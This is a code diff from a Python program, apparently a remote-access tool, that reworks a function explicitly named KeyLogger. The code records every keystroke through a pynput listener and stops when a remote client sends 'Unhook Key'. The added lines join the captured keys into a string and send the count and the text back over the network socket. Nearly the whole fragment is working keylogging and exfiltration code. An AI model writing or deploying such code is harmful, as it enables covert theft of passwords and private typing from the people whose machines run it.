@@ -76,22 +76,23 @@ def Server_Running():
         import pynput
         import time
         from pynput.keyboard import Key, Listener, Controller
-
         keyboard = Controller()
         keys = []
         KeyStop = True
         def Stop():
-            try:
-                while True:
-                    nonlocal KeyStop
-                    check = client.recv(1024).decode("utf8")
-                    print(check)
-                    if check == "Unhook Key":
-                        client.sendall(bytes("OK","utf8"))
-                        KeyStop = False
-                        break
-            finally:
-                keyboard.release(Key.space)
+            nonlocal KeyStop
+            if KeyStop == True:
+                try:
+                    while True:                       
+                        check = client.recv(1024).decode("utf8")
+                        print(check)
+                        if check == "Unhook Key":  
+                                                 
+                            KeyStop = False
+                            break
+                finally:
+                    keyboard.release(Key.space)
+
         t1 = threading.Thread(target=Stop)
         def KeyLogger():
             def on_press(key):
@@ -102,8 +103,25 @@ def Server_Running():
             with Listener(on_release = on_release, on_press = on_press) as listener:
                 t1.join()
                 listener.join()
-            for i in keys:
-                print(str(i))
+            def write(keys):
+                global count
+                count = 0
+                keylog = ''
+                for key in keys:
+
+                    k = str(key).replace("'","")
+                    #if( k == "Key.shift" or k == "")
+                        #k=""
+                    keylog += k
+                    count+=1
+                return keylog[0:]
+            data = write(keys)
+            print(data)
+            client.sendall(bytes(str(count),"utf8"))
+            client.sendall(bytes(data,"utf8"))
+            check = client.recv(1024).decode("utf8")
+            keys.clear()
+            
         t2 = threading.Thread(target=KeyLogger)
         t1.start()
         t2.start()
